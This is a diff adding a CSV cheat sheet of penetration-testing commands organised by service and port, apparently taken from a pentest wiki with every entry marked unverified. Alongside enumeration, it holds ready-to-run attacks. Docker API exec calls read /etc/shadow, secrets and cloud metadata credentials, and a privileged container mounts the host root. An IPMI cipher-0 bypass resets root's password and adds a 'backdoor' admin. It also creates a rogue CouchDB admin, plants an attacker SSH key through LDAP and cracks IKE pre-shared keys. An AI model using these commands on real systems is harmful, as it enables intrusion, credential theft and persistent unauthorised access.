@@ -1,0 +1,1466 @@
+Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
+Cassandra,9042,None,NoNameAdded,No Description,"# pip install cqlsh
+cqlsh <IP>
+#Basic info enumeration
+SELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local;
+#Keyspace enumeration
+SELECT keyspace_name FROM system.schema_keyspaces;
+desc <Keyspace_name>    #Decribe that DB
+desc system_auth        #Describe the DB called system_auth
+SELECT * from system_auth.roles;  #Retreive that info, can contain credential hashes
+SELECT * from logdb.user_auth;    #Can contain credential hashes
+SELECT * from logdb.user;
+SELECT * from configuration.""config"";
+",Unverified,1
+Cassandra,9042,None,NoNameAdded,No Description,"nmap -sV --script cassandra-info -p <PORT> {IP}
+",Unverified,1
+BACNet,47808,None,NoNameAdded,No Description,"# pip3 install BAC0
+import BAC0
+bbmdIP = '<IP>:47808'
+bbmdTTL = 900
+bacnet = BAC0.connect(bbmdAddress=bbmdIP, bbmdTTL=bbmdTTL) #Connect
+bacnet.vendorName.strValue
+#I couldn't find how to obtain the same data as nmap with this library or any other
+#talk me if you know how please
+",Unverified,1
+BACNet,47808,None,NoNameAdded,No Description,"nmap --script bacnet-info --script-args full=yes -sU -n -sV -p 47808 {IP}
+",Unverified,1
+AJP,8009,None,NoNameAdded,No Description,"nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 {IP}
+",Unverified,1
+HSQLDB,9001,None,NoNameAdded,No Description,"# grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo ""--trans=$ENC,$HASH,$AUTH,$GROUP"" >> ike-dict.txt ;done ;done ;done ;done
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"while read line; do (echo ""Valid trans found: $line"" && sudo ike-scan -M $line {IP}) | grep -B14 ""1 returned handshake"" | grep ""Valid trans found"" ; done < ike-dict.txt
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"while read line; do (echo ""Valid trans found: $line"" && ike-scan -M --aggressive -P handshake.txt $line {IP}) | grep -B7 ""SA="" | grep ""Valid trans found"" ; done < ike-dict.txt
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"# ./ikeforce.py -s1 -a {IP} #-s1 for max speed
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"ike-scan -P -M -A -n fakeID {IP}
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"while read line; do (echo ""Found ID: $line"" && sudo ike-scan -M -A -n $line {IP}) | grep -B14 ""1 returned handshake"" | grep ""Found ID:""; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"# git clone https://github.com/SpiderLabs/ikeforce.git
+pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"# ./ikeforce.py {IP} -e -w ./wordlists/groupnames.dic
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"ike-scan -M -A -n <ID> --pskcrack=hash.txt {IP} #If aggressive mode is supported and you know the id, you can get the hash of the passwor
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"psk-crack -d <Wordlist_path> psk.txt #To crack the hash
+#You can also crack it using john (using ikescan2john.py) and hashcat.
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"fiked -g {IP} -k testgroup:secretkey -l output.txt -d
+",Unverified,1
+VPN,500,None,NoNameAdded,No Description,"# ./ikeforce.py {IP} -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
+",Unverified,1
+distcc,3632,None,NoNameAdded,No Description,"msf5 > use exploit/unix/misc/distcc_exec
+nmap -p 3632 <ip> --script distcc-exec --script-args=""distcc-exec.cmd='id'""
+",Unverified,1
+CouchDB,5984,None,NoNameAdded,No Description,"nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> {IP}
+msf> use auxiliary/scanner/couchdb/couchdb_enum
+",Unverified,1
+CouchDB,5984,None,NoNameAdded,No Description,"# {""couchdb"":""Welcome"",""version"":""0.10.1""}
+{""couchdb"":""Welcome"",""version"":""2.0.0"",""vendor"":{""name"":""The Apache Software Foundation""}}
+",Unverified,1
+CouchDB,5984,None,NoNameAdded,No Description,"# [""_global_changes"",""_metadata"",""_replicator"",""_users"",""passwords"",""simpsons""]
+",Unverified,1
+CouchDB,5984,None,NoNameAdded,No Description,"curl http://{IP}:5984/<database>
+curl http://localhost:5984/simpsons
+#Example response:
+{""db_name"":""simpsons"",""update_seq"":""7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ"",""sizes"":{""file"":62767,""external"":1320,""active"":2466},""purge_seq"":0,""other"":{""data_size"":1320},""doc_del_count"":0,""doc_count"":7,""disk_size"":62767,""disk_format_version"":6,""data_size"":2466,""compact_running"":false,""instance_start_time"":""0""}
+",Unverified,1
+CouchDB,5984,None,NoNameAdded,No Description,"curl -X GET http://{IP}:5984/{dbname}/_all_docs
+curl http://localhost:5984/simpsons/_all_docs
+#Example response:
+{""total_rows"":7,""offset"":0,""rows"":[
+{""id"":""f0042ac3dc4951b51f056467a1000dd9"",""key"":""f0042ac3dc4951b51f056467a1000dd9"",""value"":{""rev"":""1-fbdd816a5b0db0f30cf1fc38e1a37329""}},
+{""id"":""f53679a526a868d44172c83a61000d86"",""key"":""f53679a526a868d44172c83a61000d86"",""value"":{""rev"":""1-7b8ec9e1c3e29b2a826e3d14ea122f6e""}},
+{""id"":""f53679a526a868d44172c83a6100183d"",""key"":""f53679a526a868d44172c83a6100183d"",""value"":{""rev"":""1-e522ebc6aca87013a89dd4b37b762bd3""}},
+{""id"":""f53679a526a868d44172c83a61002980"",""key"":""f53679a526a868d44172c83a61002980"",""value"":{""rev"":""1-3bec18e3b8b2c41797ea9d61a01c7cdc""}},
+{""id"":""f53679a526a868d44172c83a61003068"",""key"":""f53679a526a868d44172c83a61003068"",""value"":{""rev"":""1-3d2f7da6bd52442e4598f25cc2e84540""}},
+{""id"":""f53679a526a868d44172c83a61003a2a"",""key"":""f53679a526a868d44172c83a61003a2a"",""value"":{""rev"":""1-4446bfc0826ed3d81c9115e450844fb4""}},
+{""id"":""f53679a526a868d44172c83a6100451b"",""key"":""f53679a526a868d44172c83a6100451b"",""value"":{""rev"":""1-3f6141f3aba11da1d65ff0c13fe6fd39""}}
+]}
+",Unverified,1
+CouchDB,5984,None,NoNameAdded,No Description,"curl -X GET http://{IP}:5984/{dbname}/{id}
+curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
+#Example response:
+{""_id"":""f0042ac3dc4951b51f056467a1000dd9"",""_rev"":""1-fbdd816a5b0db0f30cf1fc38e1a37329"",""character"":""Homer"",""quote"":""Doh!""}
+",Unverified,1
+CouchDB,5984,None,NoNameAdded,No Description,"curl -X PUT -d '{""type"":""user"",""name"":""hacktricks"",""roles"":[""_admin""],""roles"":[],""password"":""hacktricks""}' localhost:5984/_users/org.couchdb.user:hacktricks -H ""Content-Type:application/json""
+",Unverified,1
+SNMP,161,None,NoNameAdded,No Description,"snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_{IP}]
+snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_{IP}] 1.3.6.1.2.1.4.34.1.3 #Get {IP}v6, needed dec2hex
+snmp-check [DIR_{IP}] -p [PORT] -c [COMM_STRING]
+nmap --script ""snmp* and not snmp-brute"" <target>
+",Unverified,1
+SNMP,161,None,NoNameAdded,No Description,"# apt-get install snmp-mibs-downloader
+download-mibs
+",Unverified,1
+SNMP,161,None,NoNameAdded,No Description,"# grep -i ""trap"" *.snmp
+",Unverified,1
+SNMP,161,None,NoNameAdded,No Description,"# grep -i ""login\|fail"" *.snmp
+",Unverified,1
+SNMP,161,None,NoNameAdded,No Description,"# grep -E -o ""\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"" *.snmp
+",Unverified,1
+RTSP,554,None,NoNameAdded,No Description,"nmap -sV --scripts ""rtsp-*"" -p <PORT> {IP}
+",Unverified,1
+POP,110,None,NoNameAdded,No Description,"# nc -nv {IP} 110
+openssl s_client -connect {IP}:995 -crlf -quiet
+",Unverified,1
+POP,110,None,NoNameAdded,No Description,"nmap --scripts ""pop3-capabilities or pop3-ntlm-info"" -sV -port <PORT> {IP} #All are default scripts
+",Unverified,1
+POP,110,None,NoNameAdded,No Description,"POP commands:
+  USER uid           Log in as ""uid""
+  PASS password      Substitue ""password"" for your actual password
+  STAT               List number of messages, total mailbox size
+  LIST               List messages and sizes
+  RETR n             Show message n
+  DELE n             Mark message n for deletion
+  RSET               Undo any changes
+  QUIT               Logout (expunges messages if no RSET)
+  TOP msg n          Show first n lines of message number msg
+  CAPA               Get capabilities
+",Unverified,1
+VNC,5800,None,NoNameAdded,No Description,"nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> {IP}
+msf> use auxiliary/scanner/vnc/vnc_none_auth
+",Unverified,1
+VNC,5800,None,NoNameAdded,No Description,"# vncviewer [-passwd passwd.txt] {IP}::5901
+",Unverified,1
+VNC,5800,None,NoNameAdded,No Description,"make
+vncpwd <vnc password file>
+",Unverified,1
+FireWall-1,264,None,NoNameAdded,No Description,"printf '\x51\x00\x00\x00\x00\x00\x00\x21\x00\x00\x00\x0bsecuremote\x00' | nc -q 1 x.x.x.x 264 | grep -a CN | cut -c 2-
+",Unverified,1
+AMQP,5671,None,NoNameAdded,No Description,"nmap -sV -Pn -n -T4 -p 5672 --script amqp-info {IP}
+
+PORT     STATE SERVICE VERSION
+5672/tcp open  amqp    RabbitMQ 3.1.5 (0-9)
+| amqp-info: 
+|   capabilities: 
+|     publisher_confirms: YES
+|     exchange_exchange_bindings: YES
+|     basic.nack: YES
+|     consumer_cancel_notify: YES
+|   copyright: Copyright (C) 2007-2013 GoPivotal, Inc.
+|   information: Licensed under the MPL.  See http://www.rabbitmq.com/
+|   platform: Erlang/OTP
+|   product: RabbitMQ
+|   version: 3.1.5
+|   mechanisms: PLAIN AMQPLAIN
+|_  locales: en_US
+",Unverified,1
+IPMI,623,None,NoNameAdded,No Description,"nmap -n -p 623 10.0.0./24
+nmap -n-sU -p 623 10.0.0./24
+use  auxiliary/scanner/ipmi/ipmi_version
+",Unverified,1
+IPMI,623,None,NoNameAdded,No Description,"# use auxiliary/scanner/ipmi/ipmi_version
+",Unverified,1
+IPMI,623,None,NoNameAdded,No Description,"# apt-get install ipmitool #Install
+#Using -C 0 any password is accepted
+ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list #Use Cipher 0 to dump a list of users
+ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
+2   root             true    true       true       ADMINISTRATOR
+3   Oper1            true    true       true       ADMINISTRATOR
+ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 #Change the password of root
+",Unverified,1
+IPMI,623,None,NoNameAdded,No Description,"msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
+",Unverified,1
+IPMI,623,None,NoNameAdded,No Description,"ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
+
+ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
+1                    false  false      true      ADMINISTRATOR
+2  root            false  false      true      ADMINISTRATOR
+3  admin            true    true      true      ADMINISTRATOR
+
+ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword #Change the password of the user 2 (root) to ""newpassword""
+",Unverified,1
+IPMI,623,None,NoNameAdded,No Description,"#  cat /nv/PSBlock
+  admin                      ADMINpassword^TT                    rootOtherPassword!
+",Unverified,1
+IPMI,623,None,NoNameAdded,No Description,"# msf> use exploit/multi/upnp/libupnp_ssdp_overflow
+",Unverified,1
+IPMI,623,None,NoNameAdded,No Description,"ipmitool user list
+ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
+2  ADMIN            true    false      false      Unknown (0x00)
+3  root            true    false      false      Unknown (0x00)
+
+ipmitool user set name 4 backdoor
+ipmitool user set password 4 backdoor
+ipmitool user priv 4 4
+ipmitool user list
+ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
+2  ADMIN            true    false      false      Unknown (0x00)
+3  root            true    false      false      Unknown (0x00)
+4  backdoor        true    false      true      ADMINISTRATOR
+",Unverified,1
+Elasticsearch,9200,None,NoNameAdded,No Description,"curl -X GET ""ELASTICSEARCH-SERVER:9200/_xpack/security/user""
+{""error"":{""root_cause"":[{""type"":""exception"",""reason"":""Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node.""}],""type"":""exception"",""reason"":""Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node.""},""status"":500}
+",Unverified,1
+Elasticsearch,9200,None,NoNameAdded,No Description,"# {""error"":{""root_cause"":[{""type"":""security_exception"",""reason"":""missing authentication credentials for REST request [/]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}}],""type"":""security_exception"",""reason"":""missing authentication credentials for REST request [/]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}},""status"":401}
+",Unverified,1
+Elasticsearch,9200,None,NoNameAdded,No Description,"#List all roles on the system:
+curl -X GET ""ELASTICSEARCH-SERVER:9200/_security/role""
+
+#List all users on the system:
+curl -X GET ""ELASTICSEARCH-SERVER:9200/_security/user""
+
+#Get more information about the rights of an user:
+curl -X GET ""ELASTICSEARCH-SERVER:9200/_security/user/<USERNAME>""
+",Unverified,1
+Elasticsearch,9200,None,NoNameAdded,No Description,"curl -X POST '10.10.10.115:9200/bookindex/books' -H 'Content-Type: application/json' -d'
+ {
+    ""bookId"" : ""A00-3"",
+    ""author"" : ""Sankaran"",
+    ""publisher"" : ""Mcgrahill"",
+    ""name"" : ""how to get a job""
+ }'
+",Unverified,1
+Elasticsearch,9200,None,NoNameAdded,No Description,"msf > use auxiliary/scanner/elasticsearch/indices_enum
+",Unverified,1
+TFTP/Bittorrent-tracker,69,None,NoNameAdded,No Description,"nmap -n -Pn -sU -p69 -sV --script tftp-enum {IP}
+",Unverified,1
+TFTP/Bittorrent-tracker,69,None,NoNameAdded,No Description,"# msf5> auxiliary/admin/tftp/tftp_transfer_util
+",Unverified,1
+TFTP/Bittorrent-tracker,69,None,NoNameAdded,No Description,"# import tftpy
+client = tftpy.TftpClient(<ip>, <port>)
+client.download(""filename in server"", ""/tmp/filename"", timeout=5)
+client.upload(""filename to upload"", ""/local/path/file"", timeout=5)
+",Unverified,1
+Docker,2375,None,NoNameAdded,No Description,"docker version #Get version of docker client, API, engine, containerd, runc, docker-init
+docker info #Get more infomarion about docker settings
+docker pull registry:5000/alpine #Download the image
+docker inspect <containerid> #Get info of the contaienr
+docker network ls #List network info
+docker exec -it <containerid> /bin/sh #Get shell inside a container
+docker commit <cotainerid> registry:5000/name-container #Update container
+docker export -o alpine.tar <containerid> #Export container as tar file
+docker save -o ubuntu.tar <image> #Export an image
+docker ps -a #List running and stopped containers
+docker stop <containedID> #Stop running container
+docker rm <containerID> #Remove container ID
+docker image ls #List images
+docker rmi <imgeID> #Remove image
+docker system prune -a
+#This will remove:
+#  - all stopped containers
+#  - all networks not used by at least one container
+#  - all images without at least one container associated to them
+#  - all build cache
+",Unverified,1
+Docker,2375,None,NoNameAdded,No Description,"#Containerd CLI
+ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
+ctr images list #List images
+ctr container create registry:5000/alpine:latest alpine #Create container called alpine 
+ctr container list #List containers
+ctr container info <containerName> #Get container info
+ctr task start <containerName> #You are given a shell inside of it
+ctr task list #Get status of containers
+ctr tasks attach <containerName> #Get shell in running container
+ctr task pause <containerName> #Stop container
+ctr tasks resume <containerName> #Resume cotainer
+ctr task kill -s SIGKILL <containerName> #Stop running container
+ctr container delete <containerName>
+",Unverified,1
+Docker,2375,None,NoNameAdded,No Description,"podman --version
+podman info
+pdoman images ls
+podman ls
+",Unverified,1
+Docker,2375,None,NoNameAdded,No Description,"#Using curl
+curl -s http://open.docker.socket:2375/version | jq #Get version
+{""Platform"":{""Name"":""Docker Engine - Community""},""Components"":[{""Name"":""Engine"",""Version"":""19.03.1"",""Details"":{""ApiVersion"":""1.40"",""Arch"":""amd64"",""BuildTime"":""2019-07-25T21:19:41.000000000+00:00"",""Experimental"":""false"",""GitCommit"":""74b1e89"",""GoVersion"":""go1.12.5"",""KernelVersion"":""5.0.0-20-generic"",""MinAPIVersion"":""1.12"",""Os"":""linux""}},{""Name"":""containerd"",""Version"":""1.2.6"",""Details"":{""GitCommit"":""894b81a4b802e4eb2a91d1ce216b8817763c29fb""}},{""Name"":""runc"",""Version"":""1.0.0-rc8"",""Details"":{""GitCommit"":""425e105d5a03fabd737a126ad93d62a9eeede87f""}},{""Name"":""docker-init"",""Version"":""0.18.0"",""Details"":{""GitCommit"":""fec3683""}}],""Version"":""19.03.1"",""ApiVersion"":""1.40"",""MinAPIVersion"":""1.12"",""GitCommit"":""74b1e89"",""GoVersion"":""go1.12.5"",""Os"":""linux"",""Arch"":""amd64"",""KernelVersion"":""5.0.0-20-generic"",""BuildTime"":""2019-07-25T21:19:41.000000000+00:00""}
+
+#Using docker
+docker -H open.docker.socket:2375 version #Get version
+Client: Docker Engine - Community
+ Version:           19.03.1
+ API version:       1.40
+ Go version:        go1.12.5
+ Git commit:        74b1e89
+ Built:             Thu Jul 25 21:21:05 2019
+ OS/Arch:           linux/amd64
+ Experimental:      false
+
+Server: Docker Engine - Community
+ Engine:
+  Version:          19.03.1
+  API version:      1.40 (minimum version 1.12)
+  Go version:       go1.12.5
+  Git commit:       74b1e89
+  Built:            Thu Jul 25 21:19:41 2019
+  OS/Arch:          linux/amd64
+  Experimental:     false
+ containerd:
+  Version:          1.2.6
+  GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
+ runc:
+  Version:          1.0.0-rc8
+  GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
+ docker-init:
+  Version:          0.18.0
+  GitCommit:        fec3683
+",Unverified,1
+Docker,2375,None,NoNameAdded,No Description,"docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
+",Unverified,1
+Docker,2375,None,NoNameAdded,No Description,"#List containers
+curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
+#List processes inside a container
+curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
+#Set up and exec job to hit the metadata URL
+curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance""]}'
+#Get the output
+curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
+# list secrets (no secrets/swarm not set up)
+curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
+#Check what is mounted
+curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""mount""]}'
+#Get the output by starting the exec
+curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
+#Cat the mounted secret
+curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""cat /run/secrets/registry-key.key""]}'
+#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
+curl -s –insecure https://tls-opendocker.socket:2376/services | jq
+#Creating a container that has mounted the host file system and read /etc/shadow
+curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket2376/containers/create?name=test -d '{""Image"":""alpine"", ""Cmd"":[""/usr/bin/tail"", ""-f"", ""1234"", ""/dev/null""], ""Binds"": [ ""/:/mnt"" ], ""Privileged"": true}'
+curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
+curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""cat /mnt/etc/shadow""]}'
+curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
+#Stop the container
+curl –insecure -vv -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
+#Delete stopped containers
+curl –insecure -vv -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/prune
+",Unverified,1
+Docker,2375,None,NoNameAdded,No Description,"# msf> use exploit/linux/http/docker_daemon_tcp
+nmap -sV --script ""docker-*"" -p <PORT> <IP>
+",Unverified,1
+Docker,2375,None,NoNameAdded,No Description,"docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+cat /mnt/etc/shadow
+",Unverified,1
+Redis,6379,None,NoNameAdded,No Description,"nmap --script redis-info -sV -p 6379 {IP}
+msf> use auxiliary/scanner/redis/redis_server
+",Unverified,1
+Redis,6379,None,NoNameAdded,No Description,"# nc -vn 10.10.10.10 6379
+redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
+",Unverified,1
+Redis,6379,None,NoNameAdded,No Description,"AUTH <username> <password>
+",Unverified,1
+Redis,6379,None,NoNameAdded,No Description,"INFO
+[ ... Redis response with info ... ]
+client list
+[ ... Redis response with connected clients ... ]
+CONFIG GET *
+[ ... Get config ... ]
+",Unverified,1
+Redis,6379,None,NoNameAdded,No Description,"# SELECT 1
+[ ... Indicate the database ... ]
+KEYS * 
+[ ... Get Keys ... ]
+GET <KEY>
+[ ... Get Key ... ]
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"# >>> import ldap3
+>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
+>>> connection = ldap3.Connection(server)
+>>> connection.bind()
+True
+>>> server.info
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"# >>> server.info
+DSA info (from DSE):
+Supported LDAP versions: 3
+Naming contexts: 
+dc=DOMAIN,dc=DOMAIN
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"# >>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
+True
+>> connection.entries
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"# >> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
+True
+>>> connection.entries
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"nmap -n -sV --script ""ldap* and not brute"" {IP} #Using anonymous credentials
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"# >>> import ldap3
+>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
+>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
+>>> connection.bind()
+True
+>>> connection.extend.standard.who_am_i()
+u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
+>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"# pip3 install ldapdomaindump 
+ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '' -w '' -b ""DC=<1_SUBDOMAIN>,DC=<TDL>""
+ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""DC=<1_SUBDOMAIN>,DC=<TDL>""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"## CREDENTIALS NOT VALID RESPONSE
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v3839
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""DC=<1_SUBDOMAIN>,DC=<TDL>""
+-x Simple Authentication
+-h LDAP Server
+-D My User
+-w My password
+-b Base site, all data from here will be given
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
+#Example: ldapsearch -x -h {IP} -D 'MYDOM\john' -w 'johnpassw' -b ""CN=Users,DC=mydom,DC=local""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Computers,DC=<1_SUBDOMAIN>,DC=<TDL>""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"# <ldapsearchcmd...> | grep -i -A2 -B2 ""userpas""
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"#Read keytab file
+./klist -k /etc/krb5.keytab
+
+#Get known domains info
+./get-status
+./lsa get-status
+
+#Get basic metrics
+./get-metrics
+./lsa get-metrics
+
+#Get users
+./enum-users
+./lsa enum-users
+
+#Get groups
+./enum-groups
+./lsa enum-groups
